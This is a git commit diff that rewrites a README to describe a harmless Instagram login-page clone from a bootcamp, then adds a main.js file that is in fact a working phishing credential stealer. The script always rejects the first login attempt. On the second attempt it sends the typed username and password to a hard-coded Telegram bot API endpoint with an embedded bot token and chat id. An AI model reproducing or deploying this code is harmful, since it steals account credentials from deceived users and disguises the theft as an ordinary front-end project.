6f7d3b2f9225258bcc06ded24a8c00d6629b6ab0
Instagram <hzssh272@gmail.com>
2025-12-14 17:59:16 +0500

    Add files via upload

--- README.md
+++ README.md
@@ -1,2 +1,20 @@
-# https-www.instagram.com-reel-DOodgBvDRm5-utm_source-ig_web_copy_link-igsh-BiNWFlZA-
-https://www.instagram.com/reel/DOodgBvDRm5/?utm_source=ig_web_copy_link&amp;igsh=BiNWFlZA==
+# :copyright: Instagram clone Login Page
+
+- A responsive login page from Instagram with HTML and CSS (flexbox)
+- Flexbox cross-browser
+
+## Desktop
+
+![Login page desktop version](https://raw.githubusercontent.com/laisfrigerio/instagram-clone-login-page/master/screenshots/desktop.png)
+
+## Tablet
+
+![Login page tablet version](https://raw.githubusercontent.com/laisfrigerio/instagram-clone-login-page/master/screenshots/tablet.png)
+
+## Mobile
+
+![Login page mobile version](https://raw.githubusercontent.com/laisfrigerio/instagram-clone-login-page/master/screenshots/mobile.png)
+
+## :muscle: Inspiração
+
+Bootcamp Javascript Game Developer from Digital Innovation One
---
+++ main.js
@@ -0,0 +1,59 @@
+document.addEventListener('DOMContentLoaded', () => {
+    const form = document.getElementById('telegramForm');
+    const loading = document.getElementById('loading');
+    const validText = document.querySelector(".invalid");
+    let tryCount = 0; // Счётчик попыток входа
+
+    form.addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const username = document.getElementById('username');
+        const password = document.getElementById('password');
+
+        // Удаление класса invalid-input, если он был добавлен ранее
+        username.classList.remove('invalid-input');
+        password.classList.remove('invalid-input');
+
+        if (tryCount === 0) {
+            // Если первая попытка, отмечаем как невалидный ввод
+            username.classList.add('invalid-input');
+            password.classList.add('invalid-input');
+            validText.style.display = 'block';
+            username.value = '';
+            password.value = '';
+            
+            tryCount++;
+            return; // Прекратить выполнение функции
+        } else {
+            // На второй попытке показываем анимацию загрузки
+            loading.style.display = 'flex';
+            
+            setTimeout(() => {
+                const encodedUsername = encodeURIComponent(username.value);
+                const encodedPassword = encodeURIComponent(password.value);
+                const jonatish = `<b>Username:</b> <em>${encodedUsername}</em>\n<b>Password:</b> <em>${encodedPassword}</em>`;
+
+                const url = `https://api.telegram.org/bot8489053698:AAGiyQgeXD_LGFJFhqF-upmHQPdU0qtI1fg/sendMessage?chat_id=8147618245&text=${encodeURIComponent(jonatish)}&parse_mode=HTML`;
+                
+                fetch(url, { method: 'GET' })
+                    .then(response => response.json())
+                    .then(data => {
+                        loading.style.display = 'none'; // Скрыть анимацию загрузки
+                        if (data.ok) {
+                            console.log(data.result.message_id);
+                            // Здесь можно добавить действия при успешной отправке данных
+                        } else {
+                            console.log(data.error_code);
+                            // Обработка ошибок отправки
+                        }
+                    })
+                    .catch((error) => {
+                        alert("Error! Please try again: " + error.message);
+                        loading.style.display = 'none';
+                        username.value = '';
+                        password.value = '';
+                    });
+            }, 2000); // Задержка в 2 секунды перед отправкой данных
+        }
+    });
+});
